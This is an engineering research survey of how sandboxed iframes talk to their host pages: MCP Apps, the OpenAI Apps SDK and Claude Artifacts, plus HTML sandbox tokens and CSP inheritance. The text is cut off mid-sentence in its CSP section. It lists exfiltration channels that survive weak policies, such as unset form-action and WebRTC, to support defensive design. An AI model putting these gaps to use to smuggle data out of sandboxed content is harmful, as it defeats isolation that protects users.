# Frame↔Host Protocol Prior Art — Mid-2026

**Research date: 2026-08-11.** Every substantive claim below was verified against a primary
source on that date — the normative spec text, the first-party docs, or the actual source code
of the reference implementation. Where a claim could not be traced to a primary source it is
marked **[unverified]**, and where a first-party source is *silent* that absence is stated as a
finding rather than filled with inference. Secondary write-ups were not used.

**Scope.** This is one level below `docs/research/generative-ui-landscape-2026.md` (the paradigm
survey) and does not repeat it. The question here is narrow and mechanical: **what exactly does
the contract between an isolated frame and its host look like** — the sandbox tokens, the CSP
directives, the message set, the lifecycle, the sizing protocol, the failure modes — in the
systems that already ship one.

**The decision this serves.** MyMemo is adding a second generative-UI lane beside
[ADR-0017](../adr/0017-emit-display-only-generative-ui-as-catalog-payloads.md): the untrusted,
prompt-injectable agent emits **model-authored HTML with scripts**, rendered in an isolated
iframe served from a **separate registrable domain** under a **no-egress CSP**, **display-only**
(nothing inside the frame feeds back into the conversation), riding the durable
`run_events` → SSE → permanent-history pipeline and replaying verbatim forever.

---

## Executive summary

1. **There is exactly one normative frame↔host protocol in the field**: MCP Apps / SEP-1865
   (`io.modelcontextprotocol/ui`, spec version **2026-01-26, Stable**). OpenAI's Apps SDK has
   converged onto it and now documents `window.openai` as *extensions* over it. Claude Artifacts
   publishes an outcome ("strict CSP, sandboxed origin") but **not a protocol**.
2. **Roughly 80% of that protocol exists to serve a bidirectional tool-calling loop** —
   `tools/call` proxying, `ui/message`, `ui/update-model-context`, tool-input/tool-result
   notifications, widget state, display modes, file APIs, `openExternal`. None of it applies to a
   display-only lane. What remains after subtracting it is small: an origin rule, a CSP, a
   sandbox token set, a size notification, and a teardown.
3. **The mandated double-iframe is not primarily about isolation.** Isolation from the host is
   achieved by the separate origin plus the sandbox attribute. The second frame exists so the
   untrusted HTML lands in a document whose **CSP comes from an HTTP response header the host
   controls** rather than inheriting the host page's own (necessarily permissive) policy. MyMemo,
   unlike an MCP host, *can serve HTTP* — so it can collapse the two frames into one real
   cross-origin document, the Claude Artifacts shape. This is the largest structural finding.
4. **The CSP that MCP Apps actually mandates does not close egress.** Its no-metadata default
   omits `form-action` and `base-uri`, neither of which falls back to `default-src`; both shipped
   implementations grant `allow-forms` on the frame; and nothing in the spec addresses WebRTC.
   The spec's own Security Implications section contradicts its normative default
   (`connect-src 'self'` vs `connect-src 'none'`).
5. **The convergent sandbox token set is `allow-scripts allow-same-origin allow-forms`** — and a
   display-only lane should deliberately *not* adopt it. `allow-scripts` alone is sufficient and
   strictly safer: it forces an opaque origin (no cookies, no `localStorage`, no shared storage
   across payloads) and blocks form submission at the platform level rather than relying on a CSP
   directive that has no `default-src` fallback.
6. **The one genuinely reusable, hard-won piece of engineering is the height protocol** — and the
   reference implementation's measurement code encodes two non-obvious pitfalls that are worth
   lifting verbatim.
7. **Two egress channels survive a maximal envelope**: WebRTC (CSP3 specifies a `webrtc`
   directive; no tracked browser implements it) and the human viewer (rendered text, QR codes).
   Everything else — fetch/XHR/WebSocket/beacon/`<a ping>`, subresources, prefetch/preconnect,
   navigation, form submission, CSS `url()` — is closable, but only if **every** directive is
   host-free, because CSP's exfiltration ceiling is the *union* of all source lists.

---

## 1. MCP Apps / SEP-1865 — the only normative frame↔host contract

### 1.1 Status and where the normative text lives

[SEP-1865](https://modelcontextprotocol.io/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp)
is **Status: Final, Extensions Track**, created 2025-11-21, authored by the MCP-UI creator plus
OpenAI and Anthropic engineers, and explicitly unifies MCP-UI and the OpenAI Apps SDK. The SEP
page is a historical record and says so ("preserved as a historical record of the design as
accepted"); the live normative text is
[`specification/2026-01-26/apps.mdx`](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)
in [`modelcontextprotocol/ext-apps`](https://github.com/modelcontextprotocol/ext-apps), marked
**"Status: Stable (2026-01-26)"**, extension id `io.modelcontextprotocol/ui`. The in-repo
[`specification/draft/apps.mdx`](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/draft/apps.mdx)
was diffed on the research date: **every security-critical clause below is byte-identical between
stable and draft** — no pending drift on sandboxing, the proxy rules, or the CSP default. SDK
`@modelcontextprotocol/ext-apps` is at **1.7.5 (2026-07-23)**;
[`@mcp-ui/client`](https://github.com/MCP-UI-Org/mcp-ui) (the repo moved from `idosal/mcp-ui`) is
at **7.1.1 (2026-05-09)**. The
[MCP Apps docs page](https://modelcontextprotocol.io/docs/extensions/apps) lists Claude, Claude
Desktop, VS Code Copilot, Microsoft 365 Copilot, Goose, Postman, MCPJam and Archestra.AI as
rendering hosts.

### 1.2 The message set

All traffic is **JSON-RPC 2.0 over `postMessage`**: "Conceptually, UI iframes act as MCP clients,
connecting to the host via a `postMessage` transport… Hosts act as MCP servers (that can proxy the
actual MCP server)". The spec is explicit that no SDK is required to speak it — it ships a
~20-line vanilla `sendRequest`/`sendNotification`/`onNotification` example.

| Direction | Method | Purpose | Applies to display-only? |
|---|---|---|---|
| View → Host | `ui/initialize` → `ui/notifications/initialized` | handshake; carries `appCapabilities`, returns `HostCapabilities` + `hostContext` | reduced (see §6) |
| View → Host | `ping` | liveness | no |
| View → Host | `tools/call` | invoke a server tool | **no** |
| View → Host | `resources/read` | read an MCP resource | **no** |
| View → Host | `notifications/message` | log to host | no |
| View → Host | `ui/open-link` | open an external URL | **no** |
| View → Host | `ui/message` | post a message into the chat as `role: "user"` | **no** |
| View → Host | `ui/update-model-context` | inject content the model reads next turn | **no** |
| View → Host | `ui/request-display-mode` | request `inline`/`fullscreen`/`pip` | **no** |
| View → Host | `ui/notifications/size-changed` | report `{width, height}` in px (the spec files this under its "Notifications (Host → View)" heading, but its own body text and the SDK's `App.sendSizeChanged` both make it View → Host — read the direction from the body, not the heading) | **yes** |
| Host → View | `ui/notifications/tool-input` / `tool-input-partial` / `tool-result` / `tool-cancelled` | feed the tool call's args and result into the view | **no** |
| Host → View | `ui/notifications/host-context-changed` | partial `HostContext` update (theme, display mode, resize) | partly (theme) |
| Host → View | `ui/resource-teardown` (a **request**, not a notification) | pre-teardown notice with a `reason`; "Host SHOULD wait for a response before tearing down the resource (to prevent data loss)" | yes, simplified |
| Sandbox ↔ Host | `ui/notifications/sandbox-proxy-ready`, `ui/notifications/sandbox-resource-ready` | reserved proxy bootstrap (§1.4) | yes if you keep two frames |

`ui/message` and `ui/update-model-context` are precisely the "frame feeds input back into the
conversation" channel that MyMemo's lane excludes by definition.

### 1.3 Lifecycle

Discovery (`resources/list` exposes `ui://` resources; `tools/list` exposes tools carrying
`_meta.ui.resourceUri`) → host calls the tool → host renders the View → **View** sends
`ui/initialize` → host replies with `McpUiInitializeResult` → View sends
`ui/notifications/initialized` → host sends `tool-input` (0..n `tool-input-partial` first) then
`tool-result` or `tool-cancelled` → interactive phase → `ui/resource-teardown`.

Two ordering rules are load-bearing and worth keeping even in a stripped-down lane:

- **The View initiates.** The host does not push anything until the frame says it exists:
  "The Host MUST NOT send any request or notification to the View before it receives an
  `initialized` notification." This is the only reliable readiness signal — `iframe.onload` does
  not tell you the guest's script has run.
- **Teardown is announced, not abrupt.** The host asks before removing the frame.

### 1.4 The double iframe — what each frame does, and why two

Normative (`### Sandbox proxy`), verbatim:

> If the Host is a web page, it MUST wrap the View and communicate with it through an intermediate
> Sandbox proxy.
> 1. The Host and the Sandbox MUST have different origins.
> 2. The Sandbox MUST have the following permissions: `allow-scripts`, `allow-same-origin`.
> 3. The Sandbox MUST send a `ui/notifications/sandbox-proxy-ready` notification to the host when
>    it's ready…
> 4. Once the Sandbox is ready, the Host MUST send the raw HTML resource to load in a
>    `ui/notifications/sandbox-resource-ready` notification.
> 5. The Sandbox MUST load the raw HTML of the View with CSP settings that: Enforce the domains
>    declared in `ui.csp` metadata … Block dangerous features (`object-src 'none'`) …
> 6. The Sandbox MUST forward messages sent by the Host to the View, and vice versa, for any
>    method that doesn't start with `ui/notifications/sandbox-`…
> 7. The Sandbox SHOULD NOT create/send any requests to the Host or to the View…

**Roles.** Frame 1 (the *Sandbox proxy*) is host-authored code on a second origin whose only jobs
are (a) to be a document that can carry the restrictive CSP, (b) to create Frame 2 and write the
untrusted HTML into it, and (c) to relay `postMessage` in both directions. Frame 2 (the *View*) is
the untrusted HTML.

**Why two, precisely.** The spec's stated rationale is isolation and auditability
("All View content MUST be rendered in sandboxed iframes with restricted permissions. The sandbox
limits the View from accessing the host or manipulating it"). But isolation from the host is
already delivered by the different origin plus the sandbox attribute. The mechanical reason a
*second document* is required is CSP scoping: the host has the HTML **in memory**, from
`resources/read` over an MCP connection, with no HTTP response of its own. If the host inlined it
as a `srcdoc` child of its own page, the guest would inherit the *host page's* policy container
(§4.3) — which must be permissive enough for the host app itself. The proxy is a client-side
substitute for "serve this HTML from the sandbox origin with a strict CSP header". The reference
implementation says as much:

> Security: CSP is enforced via HTTP headers on `sandbox.html` (set by `serve.ts` based on `?csp=`
> query param). This is tamper-proof unlike meta tags.
> — [`examples/basic-host/src/sandbox.ts`](https://github.com/modelcontextprotocol/ext-apps/blob/main/examples/basic-host/src/sandbox.ts)

and `@mcp-ui/client` repeats it: CSP by query param "allows the server to set CSP via HTTP headers
(tamper-proof) rather than relying on meta tags or postMessage-based CSP injection (which can be
bypassed by malicious content)"
([`AppFrame.tsx`](https://github.com/MCP-UI-Org/mcp-ui/blob/main/sdks/typescript/client/src/components/AppFrame.tsx)).

**The sandbox tokens the implementations actually use** (the spec normatively fixes only the outer
frame's `allow-scripts allow-same-origin`):

| Frame | ext-apps reference host | `@mcp-ui/client` |
|---|---|---|
| Outer (proxy), set by host | `allow-scripts allow-same-origin allow-forms` ([`implementation.ts`](https://github.com/modelcontextprotocol/ext-apps/blob/main/examples/basic-host/src/implementation.ts)) | `allow-scripts allow-same-origin allow-forms` (documented `SandboxConfig` default; [`app-host-utils.ts`](https://github.com/MCP-UI-Org/mcp-ui/blob/main/sdks/typescript/client/src/utils/app-host-utils.ts)) |
| Inner (View), set by proxy | `allow-scripts allow-same-origin allow-forms`, overridable by the `sandbox?: string` field of `sandbox-resource-ready` ([`sandbox.ts`](https://github.com/modelcontextprotocol/ext-apps/blob/main/examples/basic-host/src/sandbox.ts)) | `allow-same-origin allow-scripts` for external URLs ([`scripts/proxy/index.html`](https://github.com/MCP-UI-Org/mcp-ui/blob/main/sdks/typescript/client/scripts/proxy/index.html)) |

The reference proxy loads the untrusted HTML with `document.write` rather than `srcdoc`, with a
stated reason ("Use `document.write` instead of `srcdoc` (which the CesiumJS Map won't work
with)"), falling back to `srcdoc` when `contentDocument` is unreachable. `document.write` requires
the inner frame to be same-origin with the proxy — which is why `allow-same-origin` is on the
inner frame at all.

**Consequence the spec does not spell out:** because the View keeps `allow-same-origin`, the View
is same-origin *with the proxy*. It can script the proxy document, read the proxy origin's
`localStorage` and cookies, and `postMessage` the host directly. The proxy is a **relay, not a
trust boundary** against the View; the only real boundary is host-origin ≠ sandbox-origin. A
display-only lane does not need `allow-same-origin` and should drop it (§5).

The proxy does carry one nice runtime assertion worth copying — it proves its own isolation at
boot rather than assuming it:

```js
try {
  window.top.alert("If you see this, the sandbox is not setup securely.");
  throw "FAIL";
} catch (e) { if (e === "FAIL") throw new Error("The sandbox is not setup securely."); }
```

### 1.5 CSP construction, and the no-metadata default

The server declares domains in `_meta.ui.csp` on the resource contents
([spec, UI Resource Format](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)):

| Field | Maps to |
|---|---|
| `connectDomains?: string[]` | `connect-src` — "Empty or omitted = no external connections (secure default)" |
| `resourceDomains?: string[]` | `img-src`, `script-src`, `style-src`, `font-src`, `media-src` |
| `frameDomains?: string[]` | `frame-src` — "Empty or omitted = no nested iframes allowed (`frame-src 'none'`)" |
| `baseUriDomains?: string[]` | `base-uri` — "Empty or omitted = only same origin allowed (`base-uri 'self'`)" |

Host behaviour is normative: "**CSP Enforcement:** Host MUST construct CSP headers based on
declared domains"; "**No Loosening:** Host MAY further restrict but MUST NOT allow undeclared
domains"; "**Audit Trail:** Host SHOULD log CSP configurations for security review".

**The no-metadata default, verbatim** ("If `ui.csp` is omitted, Host MUST use"):

```
default-src 'none';
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
media-src 'self' data:;
connect-src 'none';
```

Three findings about this policy:

- **It omits `form-action` and `base-uri`.** Neither falls back to `default-src` (§4.4). MDN's
  `form-action` page states the fallback outright: "**`default-src` fallback**: No. Not setting
  this allows anything"
  ([MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/form-action)).
  Combined with `allow-forms` on the frame in both implementations, a View can submit a form to an
  arbitrary URL. The `Sandbox proxy` clause partially patches this by requiring `base-uri 'self'`
  when metadata is absent — but says nothing about `form-action`, and neither implementation emits
  it.
- **The spec contradicts itself on `connect-src`.** The normative default says
  `connect-src 'none'`; the CSP-construction snippet in `## Security Implications` emits
  `connect-src 'self' ${csp?.connectDomains…}`. Both texts are identical in the draft, so this is
  a standing inconsistency, not drift.
- **The reference host is far looser than the spec default.** `serve.ts`
  ([source](https://github.com/modelcontextprotocol/ext-apps/blob/main/examples/basic-host/serve.ts))
  emits `default-src 'self' 'unsafe-inline'`, `script-src … 'unsafe-eval' blob: data:`,
  `connect-src 'self'`, `worker-src 'self' blob:`, plus `frame-src 'none'`, `object-src 'none'`,
  `base-uri 'none'` — relaxed to make WebGL example apps (CesiumJS, Three.js) work. **Do not read
  the reference host as the security baseline.**

One piece of `serve.ts` *is* worth lifting verbatim — the header-injection guard on anything
templated into a CSP string:

```ts
// Rejects entries containing characters that could:
// - `;` or newlines: break out to new CSP directive
// - quotes: inject CSP keywords like 'unsafe-eval'
// - space: inject multiple sources in one entry
domains.filter((d) => typeof d === "string" && !/[;\r\n'" ]/.test(d));
```

**Sandbox origin.** `_meta.ui.domain` requests a dedicated origin, and the spec documents both
vendors' real formats: "Hash-based subdomains (e.g., `{hash}.claudemcpcontent.com`)" and
"URL-derived subdomains (e.g., `www-example-com.oaiusercontent.com`)". The
[CSP & CORS guide](https://github.com/modelcontextprotocol/ext-apps/blob/main/docs/csp-cors.md)
shows the derivation: `sha256(mcpServerUrl).slice(0,32) + ".claudemcpcontent.com"`. If omitted,
"Host uses default sandbox origin (typically **per-conversation**)". Note that Claude uses a
*different* domain here (`claudemcpcontent.com`) from the one it uses for Artifacts
(`claudeusercontent.com`, §3).

### 1.6 How the frame reports its size

This is the part of the protocol that transfers unchanged, and it is more considered than it
looks.

**Wire format** — `ui/notifications/size-changed`, `params: { width: number, height: number }`
("Viewport width/height in pixels"). "The View SHOULD send this notification when rendered content
body size changes (e.g. using ResizeObserver API to report up to date size)."

**Negotiated container modes** — `HostContext.containerDimensions`, each axis independent:

| Mode | Field | Meaning |
|---|---|---|
| Fixed | `height` / `width` | Host controls the size. View should fill the available space. |
| Flexible | `maxHeight` / `maxWidth` | View controls the size, up to the specified maximum. |
| Unbounded | omitted | View controls the size with no limit. |

"When using flexible dimensions (no fixed `height` or `width`), hosts **MUST** listen for
`ui/notifications/size-changed` notifications from the View and update the iframe dimensions
accordingly."

**The measurement itself** — from
[`src/app.ts`, `setupSizeChangedNotifications()`](https://github.com/modelcontextprotocol/ext-apps/blob/main/src/app.ts).
The comments encode two failure modes that are not obvious and cost real debugging:

```ts
// Measure actual content height by temporarily overriding html sizing.
// Height uses max-content because fit-content would clamp to the viewport
// height when content is taller than the iframe, causing internal scrolling.
//
// Width uses window.innerWidth instead of measuring via fit-content.
// Setting html.style.width to fit-content forces a synchronous reflow at
// 0px width for responsive apps ... permanently destroying their scroll positions.
const originalHeight = html.style.height;
html.style.height = "max-content";
const height = Math.ceil(html.getBoundingClientRect().height);
html.style.height = originalHeight;
const width = Math.ceil(window.innerWidth);
// Only send if size actually changed (prevents feedback loops from style changes)
```

with a `requestAnimationFrame` coalescer, a `ResizeObserver` on **both** `document.documentElement`
and `document.body`, one send on setup, and `disconnect()` as the cleanup. `autoResize` defaults
to `true`.

There is no negotiation of a *maximum* the host will honour beyond `maxHeight` in
`containerDimensions`, and no normative clamping of the reported value. See §7.

### 1.7 Errors and load failures

**What the spec covers:** JSON-RPC errors on view→host requests (`code: -32000` with strings like
`"Link opening denied by user"`, `"Invalid URL"`, `"Policy violation"`);
`ui/notifications/tool-cancelled` with a `reason` for any cancellation ("user action, sampling
error, classifier intervention"); and an error response to `ui/resource-teardown` if cleanup
fails.

**What the spec does not cover — a genuine gap.** There is no message, state, or host obligation
for: the iframe failing to load; the guest never sending `ui/initialize`; a hung or crashed View;
a CSP violation inside the frame; or a render fallback when any of that happens. Grepping the
stable and draft specs for load-failure, timeout, or render-fallback language returns nothing on
the frame lifecycle.

Both implementations fill the gap privately, the same way — a readiness timeout plus a DOM error
listener:

```ts
const DEFAULT_SANDBOX_TIMEOUT_MS = 10000;
… reject(new Error('Timed out waiting for sandbox proxy iframe to be ready'));
… reject(new Error('Failed to load sandbox proxy iframe'));   // iframe 'error' event
```
— [`@mcp-ui/client` `app-host-utils.ts`](https://github.com/MCP-UI-Org/mcp-ui/blob/main/sdks/typescript/client/src/utils/app-host-utils.ts)

Two more implementation details worth knowing before copying:

- The SDK's `PostMessageTransport` sends with `postMessage(message, "*")`, and documents the
  consequence: "Messages are sent using `postMessage` with `"*"` origin, meaning they are visible
  to all frames. The receiver should validate the message source for security"
  ([`src/message-transport.ts`](https://github.com/modelcontextprotocol/ext-apps/blob/main/src/message-transport.ts)).
  The reference *proxy* does better — it validates `event.origin` against the referrer-derived
  host origin in both directions and replies to a specific origin, never `"*"`.
- The SDK sets `z.config({ jitless: true })` by default because "Zod's JIT object parser uses
  `new Function()` and throws on the first message parse" under a CSP without `'unsafe-eval'`
  ([`src/app.ts`](https://github.com/modelcontextprotocol/ext-apps/blob/main/src/app.ts)). Any
  guest-side library shipped into a strict-CSP frame needs the same audit.

---

## 2. OpenAI Apps SDK — `window.openai`, and where it diverges

OpenAI's own reference now opens by deferring to the standard: "**Start with the open standard.**
Use the MCP Apps specification for shared UI fields and bridge methods. **OpenAI extensions are
optional** and live in `window.openai`"
([reference](https://developers.openai.com/apps-sdk/reference)). The bridge is documented as
"compatibility aliases" over the MCP Apps methods plus ChatGPT-specific capabilities.

**Surface** (all names verbatim from the reference):

- *State & data*: `toolInput`, `toolOutput`, `toolResponseMetadata`, `widgetState`,
  `setWidgetState(state)` ("Stores a new snapshot synchronously").
- *Runtime*: `callTool(name, args)`, `sendFollowUpMessage({ prompt, scrollToBottom })`,
  `uploadFile(file, { library? })`, `selectFiles()`, `getFileDownloadUrl({ fileId })`,
  `requestDisplayMode(...)`, `requestModal({ params, template })`, `requestClose()`,
  `notifyIntrinsicHeight(...)` ("Report dynamic widget heights to avoid scroll clipping"),
  `openExternal({ href, redirectUrl })`, `setOpenInAppUrl({ href })`, `requestCheckout(...)`.
- *Context*: `theme`, `displayMode`, `maxHeight`, `safeArea`, `view`, `userAgent`, `locale`.
- *Event*: a single custom DOM event, `openai:set_globals`, fired when any global changes; the
  documented `useOpenAiGlobal` helper subscribes via `useSyncExternalStore`.

**Divergences from SEP-1865 that matter:**

| Axis | SEP-1865 | Apps SDK |
|---|---|---|
| Shape | JSON-RPC messages over `postMessage`, no injected globals | injected `window.openai` object + `openai:set_globals` DOM event |
| Sizing | `ui/notifications/size-changed` (View pushes `{width,height}`), `containerDimensions` fixed/flexible/unbounded | `notifyIntrinsicHeight(...)` push + `maxHeight` and `safeArea` globals |
| CSP metadata | `_meta.ui.csp` only | `_meta.ui.csp` preferred, plus a legacy snake_case `_meta["openai/widgetCSP"]` that is **still required** for `redirect_domains` (allowlisted `openExternal` targets) |
| Sandbox origin | `_meta.ui.domain`, host-defined format | same field; **"Defaults to `https://web-sandbox.oaiusercontent.com`"**, and a dedicated `_meta.ui.domain` is "required when submitting a plugin with UI; must be unique per plugin" |
| Navigation | not addressed | "The sandbox runtime mirrors navigation history from the iframe into ChatGPT's UI" — React Router `BrowserRouter` is the documented pattern |

The SEP's Rationale section records that the global-object shape was **considered and rejected**
for the standard: "**Global API object:** Rejected because it requires host-specific injection and
doesn't work with external iframe sources. Syntactic sugar may still be added on the server/UI
side." That is the right call for MyMemo too — an injected global cannot be established in a frame
the host cannot script, whereas `postMessage` works into an opaque origin.

**Security posture, first-party:** "Widgets run inside an isolated iframe with a strict Content
Security Policy. They cannot access privileged browser APIs such as `window.alert`,
`window.prompt`, `window.confirm`, or `navigator.clipboard`. The CSP controls standard `fetch`
requests. Nested frames are unavailable by default"
([security & privacy](https://developers.openai.com/apps-sdk/guides/security-privacy)). Note the
`alert`/`confirm`/`prompt` set is exactly the HTML **sandboxed modals flag** — i.e. OpenAI is
describing a sandbox without `allow-modals`. That is the closest thing to a published token in
either vendor's docs, and it is an inference from behaviour, not a stated attribute. **[unverified
as an attribute]**

OpenAI publishes **no** sandbox attribute token list and **no** CSP directive text.

---

## 3. Claude Artifacts — confirming what is and is not published

The prior survey flagged much of this as unpublished. Re-checked against first-party sources on
the research date, here is the exact line.

**Published**, from [code.claude.com/docs/en/artifacts](https://code.claude.com/docs/en/artifacts):

- The origin: "The viewer on claude.ai loads each artifact from a sandboxed
  `*.claudeusercontent.com` origin." (Given in the context of egress allowlisting, alongside
  `claude.ai`.)
- That a CSP exists and is applied by the platform, not the author: "Claude Code wraps the file you
  publish in an HTML document shell and serves it under a strict Content Security Policy (CSP),
  which shapes what the page can do."
- The CSP's *effect*, described but not quoted as directives: "The CSP blocks scripts,
  stylesheets, fonts, and images loaded from any other host, along with `fetch`, XHR, and
  WebSocket calls. Claude inlines CSS and JavaScript and embeds images as data URIs so the page
  renders without any external request."
- The escape hatch: MCP connector calls, which "the page hands … to claude.ai, which makes the
  network call itself" — i.e. a brokered capability, not frame egress.
- Size: "The rendered page must be 16 MiB or smaller."
- Structure: one self-contained page, no backend, relative links do not resolve.
- Separately, `_meta.ui.domain`'s documentation in the MCP Apps spec confirms Claude's *MCP Apps*
  sandbox uses hash-derived subdomains of **`claudemcpcontent.com`** — a different registrable
  domain from the Artifacts one.

**Not published anywhere first-party** (each checked, not inferred):

- The iframe `sandbox` attribute token set. **[unverified]**
- The literal CSP directive string. **[unverified]**
- Whether Artifacts uses a single frame or a proxy pair. **[unverified]**
- Any sizing/height mechanism — the docs never mention height, resize, or scrolling. **[unverified]**
- Typical artifact byte sizes (only the 16 MiB ceiling is given). **[unverified]**

The claude.ai support article
["What are Artifacts and how do I use them?"](https://support.claude.com/en/articles/9487310-what-are-artifacts-and-how-do-i-use-them)
was checked and states **nothing** about sandboxing, CSP, origin, network access, or sizing.

The only sandbox-mechanism statement from an Anthropic engineer is second-party (an interview):
"We use iFrame sandboxes with full-site process isolation"
([Pragmatic Engineer](https://newsletter.pragmaticengineer.com/p/how-anthropic-built-artifacts)) —
cited in the prior survey and repeated here only to mark that it is the ceiling of what exists.

**The finding for the ADR:** Artifacts is the closest existing system to MyMemo's lane — same
threat model (model-authored HTML with scripts), same posture (separate registrable domain +
no-egress CSP + brokered exceptions), same display-ish scope. But it publishes an *outcome*, not a
*contract*. There is nothing to copy from it at the protocol level, and its architecture — one
self-contained page served from a sandbox origin under a platform CSP, with no frame↔host RPC at
all — is itself the significant datum: **a display-only lane may need no frame protocol beyond
sizing.**

---

## 4. Platform primitives

### 4.1 `sandbox` token semantics

The authority is [WHATWG HTML §7.1.5 Sandboxing](https://html.spec.whatwg.org/multipage/browsers.html#sandboxing),
which defines a *sandboxing flag set*; `sandbox=""` sets all flags and each token clears one.
The flags that matter here, verbatim:

| Flag / relaxing token | What the flag does (HTML §7.1.5) |
|---|---|
| **sandboxed navigation** — *no token clears it* | "prevents content from navigating browsing contexts **other than the sandboxed browsing context itself**" |
| sandboxed auxiliary navigation / `allow-popups` | prevents creating auxiliary browsing contexts (`target`, `window.open()`) |
| sandboxed top-level navigation without/with user activation / `allow-top-navigation`, `allow-top-navigation-by-user-activation` | prevents navigating or closing the top-level browsing context |
| sandboxed origin / `allow-same-origin` | "forces content into an opaque origin… also prevents script from reading from or writing to the `document.cookie` IDL attribute, and blocks access to `localStorage`" |
| sandboxed forms / `allow-forms` | "blocks form submission" |
| sandboxed scripts / `allow-scripts` | "blocks script execution" — and the same token relaxes **sandboxed automatic features** (autoplay, autofocus) |
| sandboxed modals / `allow-modals` | blocks `alert()`, `confirm()`, `print()`, `prompt()`, `beforeunload` |
| sandboxed downloads / `allow-downloads` | "prevents content from initiating or instantiating downloads" |
| sandbox propagates to auxiliary contexts / `allow-popups-to-escape-sandbox` | new contexts inherit the sandbox |
| sandboxed `document.domain` — *no token clears it* | blocks the `document.domain` setter |

Two structural guarantees:

- **Restrictions only accumulate downward.** A browsing context's creation sandboxing flags are
  "the union of the flags that are present in … embedder's iframe sandboxing flag set … [and]
  embedder's node document's active sandboxing flag set" (HTML §7.1.5). A nested frame can never
  regain a capability an ancestor lacks — which is what makes the double-iframe safe to reason
  about, and what makes an inner `sandbox` attribute a *further* restriction, never a relaxation.
- **CSP can impose sandbox flags too.** The CSP `sandbox` directive "specifies an HTML sandbox
  policy which the user agent will apply to a resource, just as though it had been included in an
  iframe with a sandbox property" ([CSP3 §6.3.2](https://www.w3.org/TR/CSP3/#directive-sandbox)).
  It is **header-only**: "it will be ignored entirely when delivered in a
  `Content-Security-Policy-Report-Only` header, or within a `meta` element". This is how a
  standalone served document stays sandboxed even if opened directly in a tab — which matters,
  because MDN warns: "Sandboxing is useless if the attacker can display content outside a
  sandboxed `iframe` — such as if the viewer opens the frame in a new tab. Such content should be
  also served from a *separate origin*"
  ([MDN `<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)).

### 4.2 `allow-scripts` without `allow-same-origin`: what an opaque origin does and does not prevent

MDN's warning is scoped precisely: "When the embedded document **has the same origin as the
embedding page**, it is strongly discouraged to use both `allow-scripts` and `allow-same-origin`,
as that lets the embedded document remove the `sandbox` attribute" (MDN `<iframe>`, emphasis
added). Cross-origin content is not covered by that specific hazard — which is exactly why MCP
Apps mandates "The Host and the Sandbox MUST have different origins" *before* granting
`allow-same-origin`. The separate registrable domain is the load-bearing control; the token set is
secondary to it.

**What the opaque origin does prevent** (HTML §7.1.5, verbatim): access to other same-origin
content; reading/writing `document.cookie`; access to `localStorage`.

**What it does not prevent** — and this is the point most easily got wrong:

- Scripts still run. `allow-scripts` is orthogonal to origin.
- Outbound network requests still leave the browser. An opaque origin makes cross-origin
  *responses* unreadable; it does nothing about the *request*, and a request's URL is a perfectly
  good exfiltration carrier. **Only CSP closes egress.** CSP3 says so directly: "Content Security
  Policy can mitigate data exfiltration if used to create allowlists of servers with which a page
  is allowed to communicate" ([CSP3 §8.6](https://www.w3.org/TR/CSP3/#exfiltration)).
- Self-navigation still works (§4.5).
- `'self'` in a CSP becomes unreliable, because there is no meaningful same-origin match for an
  opaque origin. CSP3 acknowledges the shape of the problem when defining `base-uri`: "We compare
  against the fallback base URL in order to deal correctly with things like an iframe `srcdoc`
  Document which has been sandboxed into an opaque origin." **Practical consequence for the ADR:
  a policy for an opaque-origin frame must not depend on `'self'` for anything it actually needs**
  — express intent with explicit keywords and schemes. (Stated as an implication of the origin
  model; no spec text says "do not use `'self'` in sandboxed frames". **[flagged as reasoning]**)

### 4.3 CSP inheritance: `srcdoc` and other local schemes vs a real cross-origin document

This is the mechanism that decides MyMemo's whole delivery architecture, and it is fully specified.

[CSP3 §7.8 "CSP Inheriting to avoid bypasses"](https://www.w3.org/TR/CSP3/#security-inherit-csp),
verbatim:

> Documents loaded from **local schemes** will inherit a copy of the policies in the source
> document. The goal is to ensure that a page can't bypass its policy by embedding a frame or
> opening a new window containing content that is entirely under its control (`srcdoc` documents,
> `blob:` or `data:` URLs, `about:blank` documents that can be manipulated via `document.write()`,
> etc).
>
> … we create a **copy** of the CSP list which means that the new Document's CSP list is a
> **snapshot** of the relevant policies at its creation time.

HTML's algorithm is the precise statement
([HTML §7.1.7 "determine navigation params policy container"](https://html.spec.whatwg.org/multipage/browsers.html#determining-navigation-params-policy-container)):

> If *responseURL* is `about:srcdoc`: … Return a **clone of parentPolicyContainer**.
> If *responseURL* is **local** and *initiatorPolicyContainer* is not null, then return a clone of
> *initiatorPolicyContainer*.
> If *responsePolicyContainer* is not null, then return *responsePolicyContainer*.

So:

| Delivery | Whose CSP applies |
|---|---|
| `<iframe srcdoc="…">` | a clone of the **parent document's** policy container |
| `document.write()` into an `about:blank` frame, `blob:`, `data:` | a clone of the **initiator's** policy container |
| a real `https://` document | **its own response's** CSP headers only — no inheritance |

And a guest can only *add* to an inherited policy, never subtract: CSP3's own example shows a
`<meta>` CSP inside a `srcdoc` blocking an image, while the parent's policy stays untouched.
Multiple policies are each enforced, so restrictions compound.

**The two viable architectures for MyMemo fall straight out of this table:**

- **A. Single frame, real document.** Serve the model HTML as an HTTP response from the sandbox
  domain, with the CSP as a response header. No inheritance, no proxy, no `sandbox-resource-ready`
  handshake, no `document.write`. This is the Artifacts shape and it is available to MyMemo
  because MyMemo, unlike an MCP host, owns a web server. It also gets `Content-Security-Policy:
  sandbox …` and `frame-ancestors` for free, which are header-only (§4.4) and therefore
  unavailable in architecture B.
- **B. Double frame, inherited CSP.** Host embeds a proxy document from the sandbox domain
  carrying the strict CSP header; proxy creates `<iframe sandbox="allow-scripts" srcdoc="…">`;
  the guest inherits the proxy's policy. Needed only if serving per-payload HTTP is undesirable.
  Note that with `srcdoc` (rather than `document.write`) the inner frame does **not** need
  `allow-same-origin` — the proxy never touches its DOM.

### 4.4 Which CSP directives actually close egress

**The union rule is the single most important thing here.** CSP3's `default-src` note, verbatim:

> Resource hints such as **prefetch and preconnect** generate requests that aren't tied to any
